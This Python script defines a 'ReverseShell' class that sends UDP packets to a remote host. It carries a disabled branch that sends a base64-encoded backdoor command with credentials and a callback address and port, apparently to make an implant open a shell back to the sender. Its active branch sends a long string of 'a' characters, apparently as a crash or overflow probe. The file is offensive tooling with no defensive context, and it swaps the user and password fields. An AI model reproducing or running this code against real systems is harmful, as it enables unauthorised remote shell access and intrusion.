import base64
import socket

class ReverseShell:
    def __init__(self, 
            lhost:str,
            lport:int,
            rhost:str,
            rport:int,
            session_user:str,
            session_pass:str):
        self.lhost = lhost
        self.lport = lport
        self.rhost = rhost
        self.rport = rport
        self.session_pass = session_pass
        self.session_user = session_user
        
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def encode_base64(self, target:str) -> str:
        return base64.b64encode(str(target).encode())

    def decode_base64(self, target:str) ->str:
        return base64.b64decode(target).decode()
    
    def run(self):
        
        s = False
        if s:
            payload = "<DOOR><PASS>{Pass}</PASS><USER>{user}</USER><HOST>{lhost}</HOST><PORT>{lport}</PORT></DOOR>".format(
                    Pass = self.session_user,
                    user = self.session_pass,
                    lhost = self.lhost,
                    lport = self.lport
                    )
            self.sock.sendto(self.encode_base64(payload),(self.rhost, self.rport))
        else:
            payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
         
            self.sock.sendto(bytes(payload, "utf-8"),(self.rhost, self.rport))
        

        self.sock.settimeout(4);
        try:
            r= self.sock.recv(1024)
            print(r)
        except Exception as e:
            print("{}\nrport may not be set correctly".format(e))
            
        self.sock.close()
        

if __name__ == "__main__":
    
    session = ReverseShell(
            lhost = "127.0.0.1",
            lport = 4444,
            rhost = "127.0.0.1",
            rport = 41333,
            session_pass= "test",
            session_user = "admin")
     
    session.run()


